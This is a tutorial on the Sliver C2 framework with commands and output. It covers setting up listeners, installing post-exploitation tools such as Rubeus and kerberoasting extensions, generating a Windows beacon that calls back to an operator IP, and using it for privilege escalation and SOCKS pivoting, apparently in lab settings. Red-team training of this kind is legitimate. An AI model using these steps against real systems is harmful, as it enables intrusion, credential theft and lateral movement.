- https://github.com/BishopFox/sliver
# Installation
Download both the sliver-server and sliver-client from the [release](https://github.com/BishopFox/sliver/releases) for your platform and you are done :)
```bash
➜  sliver wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
```

```bash
➜  sliver wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
```

```bash
➜  sliver ls
sliver-client  sliver-server
```
Now we can run the sliver-server and it will drop us in a console where we can do basically everything we expect from a C2, like generating payloads, beacons, start listeners, interact with our beacons, etc...  
```bash
➜  sliver ./sliver-server
[*] Loaded 21 aliases from disk
[*] Loaded 110 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain infect
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver >
```
# Multiplayer Mode
Multiplayer-mode allows multiple operators (players) to connect to the same Sliver server. Basically, you start the server and you can also start the client that will connect to the server where you get the same console, and the server can be remotely somewhere, but also it can be locally because if you accidently close the server, the beacons will have trouble connecting back to you but if you close the client nothing bad would happen, hope that makes sense.
To setup multiplayer mode, we need to first create a new operator and give it a name, then we tell it that the connection will come from localhost:
```bash
[server] sliver > new-operator --name serioton --lhost localhost

[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /home/serioton/sliver/serioton_localhost.cfg
```
Now, we need to put sliver into multiplayer mode:
```bash
[server] sliver > multiplayer

[*] Multiplayer mode enabled!
```
In another tab we can start the sliver-client and tell it to import the configurations we just generated:
```bash
➜  sliver ./sliver-client import /home/serioton/sliver/serioton_localhost.cfg
2024/06/30 07:12:54 Saved new client config to: /home/serioton/.sliver-client/configs/serioton_localhost.cfg
```
After that, we just start the client and it will connect to the server
```bash
➜  sliver ./sliver-client
? Select a server: serioton@localhost (2a966044d4c58511)
Connecting to localhost:31337 ...
[*] Loaded 21 aliases from disk
[*] Loaded 110 extension(s) from disk

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain prowess
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >
```
We will get this message in the server
```bash
[*] serioton has joined the game
```
# Installing the tools
To install all the third-party post exploitation tools, we can run the following command:
```bash
sliver > armory install all

? Install 21 aliases and 128 extensions? Yes
[*] Installing alias 'Rubeus' (v0.0.24) ... done!
[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!
[*] Installing alias 'SharpLAPS' (v0.0.1) ... done!
[*] Installing alias 'NoPowerShell' (v0.0.2) ... done!
[*] Installing alias 'SharpChrome' (v0.0.3) ... done!
[*] Installing alias 'SharpSCCM' (v0.0.2) ... done!
[*] Installing alias 'sharpsh' (v0.0.1) ... done!
[*] Installing alias 'SharpHound v4' (v0.0.2) ... done!
[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!
[*] Installing alias 'Certify' (v0.0.3) ... done!
[*] Installing alias 'SharpUp' (v0.0.1) ... done!
[*] Installing alias 'SharpRDP' (v0.0.1) ... done!
[*] Installing alias 'sqlrecon' (v0.0.3) ... done!
[*] Installing alias 'Seatbelt' (v0.0.5) ... done!
[*] Installing alias 'SharPersist' (v0.0.2) ... done!
[*] Installing alias 'Sharp Hound 3' (v0.0.2) ... done!
[SNIP]
[*] All packages installed
```
If we want to list all the available packages, we can run the `armory` command without arguments:
```bash
sliver > armory

[*] Fetching 1 armory index(es) ... done!
[*] Fetching package information ... done!

 Packages
 Command Name                  Version   Type        Help
============================= ========= =========== =========================================================================================================================================
 bof-roast                     v0.0.2    Extension   Beacon Object File repo for roasting Active Directory
 bof-servicemove               v0.0.1    Extension   Lateral movement technique by abusing Windows Perception Simulation Service to achieve DLL hijacking
 c2tc-addmachineaccount        v0.0.9    Extension   AddMachineAccount [Computername] [Password <Optional>]
 c2tc-askcreds                 v0.0.9    Extension   Collect passwords using CredUIPromptForWindowsCredentialsName
 c2tc-domaininfo               v0.0.9    Extension   enumerate domain information using Active Directory Domain Services
 c2tc-kerberoast               v0.0.9    Extension   A BOF tool to list all SPN enabled user/service accounts or request service tickets (TGS-REP)

[SNIP]
```
If we want to install a specific package, we can do so by providing the package name:
```bash
sliver > armory install rubeus

[*] Installing alias 'Rubeus' (v0.0.24) ... done!
```
# Basic Commands
## Setup a listener
To create a listener on port 53, we can use the following command:
```bash
sliver > mtls --lport 53

[*] Starting mTLS listener ...

[*] Successfully started job #2
```
`mtls` means mutual TLS which is a TCP listener but the communication over it is encrypted.
We can also start http or https listeners:
```bash
sliver > http --lport 80

[*] Starting HTTP :80 listener ...
[*] Successfully started job #3
```
```bash
sliver > https --lport 8443

[*] Starting HTTPS :8443 listener ...

[*] Successfully started job #4
```
## List and kill jobs
We can see the listeners we have using the `jobs` command
```bash
sliver > jobs

 ID   Name    Protocol   Port    Stage Profile
==== ======= ========== ======= ===============
 1    grpc    tcp        31337
 2    mtls    tcp        53
 3    http    tcp        80
 4    https   tcp        8443
```
To kill a listener, we use the command `jobs -k <listener_id>` and provide the listener ID we want to stop:
```bash
sliver > jobs -k 3

[*] Killing job #3 ...
[!] Job #3 stopped (tcp/http)

[!] Job #3 stopped (tcp/http)

[*] Successfully killed job #3
```
```bash
sliver > jobs -k 4

[*] Killing job #4 ...
[!] Job #4 stopped (tcp/https)

[*] Successfully killed job #4

[!] Job #4 stopped (tcp/https)
```
```bash
sliver > jobs

 ID   Name   Protocol   Port    Stage Profile
==== ====== ========== ======= ===============
 1    grpc   tcp        31337
 2    mtls   tcp        53
```
# Beacons
## Generating beacons
To generate a beacon, we can use the `generate beacon` command, in this case we generate a beacon for windows 64 bit, the format is .exe and we tell it to connect to our IP:
```bash
sliver > generate beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format EXECUTABLE --http <IP> --name meow --save /tmp/beacon.exe -G --skip-symbols

[*] Generating new windows/amd64 beacon implant binary (30s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /tmp/beacon.exe
```
The `-G` skips `Shikata-Ganai-Encoding` and `--skip-symbols` will leave sliver strings inside the binary. This reduces file size but can lead to detection.
## Listing and interacting with beacons
To list all the beacons we have, we can use the `beacons` command:
```bash
sliver > beacons

 ID         Name           Transport   Hostname    Username               Operating System   Last Check-In   Next Check-In
========== ============== =========== =========== ====================== ================== =============== ===============
 a7b8c0ca   mist-http      http(s)     MS01        MIST\Brandon.Keywarp   windows/amd64      257h38m33s      257h38m2s
 7717ce78   axlle          http(s)     MAINFRAME   AXLLE\gideon.hamill    windows/amd64      180h58m49s      180h58m18s
 [SNIP]
 ede730e4   meow   http(s)     DC1         BLAZORIZED\NU_1055     windows/amd64      11h50m21s       11h49m50s
```
To interact with a beacon, we can run the `use` command and give it the beacon ID:
```bash
sliver > use ede730e4

[*] Active beacon meow (ede730e4-cc70-4552-9e7f-f4a8fa557615)

sliver (meow) >
```
# Sessions
To turn a beacon into a session, we run the `interactive` command:
```bash
sliver (meow) > interactive

[*] Using beacon's active C2 endpoint: https://10.10.14.8:8443
[*] Tasked beacon meow (8d057a41)
```
This will create a running task that will open an interactive session when it's time to execute again
```bash
[*] Session 2b8213e1 ...
```
We can list sessions using the command `sessions`. If we want to switch to the context of the session, we can do so by using the following command:
```bash
sliver (meow) > use 2b8213e1-5f9e-4d4f-b003-b17e62a239c3

[*] Active session meow (2b8213e1-5f9e-4d4f-b003-b17e62a239c3)
```
# Other useful commands
### execute-assembly
With `execute-assembly` we can run a .NET assembly (DLL or exe) in memory, by spawning a new process (notepad by default) that hosts the _.NET-CLR_.
### getsystem
Spawn a new session as NT AUTHORITY/SYSTEM, by injecting into a system process when you are already in a high privileged shell.
### ps
List processes and identify running security products such as AVs and EDRs.
### socks5
Start a socks5 proxy in your implant with socks5 start. This proxy can then be used with e.g. proxychains to tunnel your tools through the implant into the corporate network.
### sideload
Load and execute a shared object (shared library/DLL) in a remote process
# Conclusion
This was a basic intro to sliver C2, but there's a lot more you can do with it. Checkout the official documentation here: https://sliver.sh/docs. It's very detailed and explains many things you can do with Sliver.
# Resources
- https://bishopfox.com/blog/passing-the-osep-exam-using-sliver
